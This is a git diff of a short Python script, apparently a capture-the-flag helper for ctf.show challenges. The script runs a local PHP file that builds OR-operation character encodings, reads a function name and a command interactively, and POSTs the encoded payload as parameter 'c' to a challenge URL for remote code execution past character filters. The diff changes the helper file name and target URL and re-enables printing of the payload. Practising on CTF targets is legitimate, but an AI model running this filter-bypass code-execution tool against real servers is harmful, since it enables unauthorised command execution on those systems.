@@ -3,7 +3,7 @@ import urllib
 from sys import *
 import os
 
-os.system("php rce_or.php")  # 没有将php写入环境变量需手动运行
+os.system("php 或运算字符.php")  # 没有将php写入环境变量需手动运行
 """
 if (len(argv) != 2):
     print("=" * 50)
@@ -12,7 +12,7 @@ if (len(argv) != 2):
     print("=" * 50)
     exit(0)
 """
-url = 'http://5f06d274-8b24-449c-83ac-cd2cee6284bd.challenge.ctf.show:8080/'
+url = 'http://900b8b32-4a33-4f43-85ab-7a103e85af07.challenge.ctf.show/'
 
 
 # url = argv[1]
@@ -39,9 +39,10 @@ def action(arg):
 
 while True:
     param = action(input("\n[+] your function：")) + action(input("[+] your command："))
-    # print(param,"\n")
+    print(param, "\n")
     data = {
-        'c': urllib.parse.unquote(param)
+        'c': urllib.parse.unquote(param)  # ?c=
     }
     r = requests.post(url, data=data)
     print("\n[*] result:\n" + r.text)
+
